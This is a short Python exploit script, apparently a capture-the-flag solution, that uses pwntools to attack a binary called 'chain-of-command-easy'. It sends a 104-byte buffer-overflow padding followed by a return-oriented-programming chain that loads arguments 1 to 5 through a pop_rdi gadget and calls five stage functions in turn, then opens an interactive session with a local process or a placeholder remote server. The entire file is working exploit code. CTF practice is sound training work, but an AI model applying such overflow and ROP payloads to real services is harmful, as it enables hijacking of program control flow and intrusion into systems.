#!/usr/bin/env python3

from pwn import *

exe = ELF("./chain-of-command-easy")

context.binary = exe

gdb_script = """
b *main
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r

pop_rdi = 0x402b53
ret_gadget = 0x40101a
stage1 = 0x4023d9
stage2 = 0x402760
stage3 = 0x402598
stage4 = 0x40267a
stage5 = 0x4024b5
offset = 104

def main():
    r = conn()

    # good luck pwning :)
    payload = flat(
        b"A" * offset,
        ret_gadget,
        pop_rdi, 0x1,
        stage1,
        pop_rdi, 0x2,
        stage2,
        pop_rdi, 0x3,
        stage3,
        pop_rdi, 0x4,
        stage4,
        pop_rdi, 0x5,
        stage5
    )
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
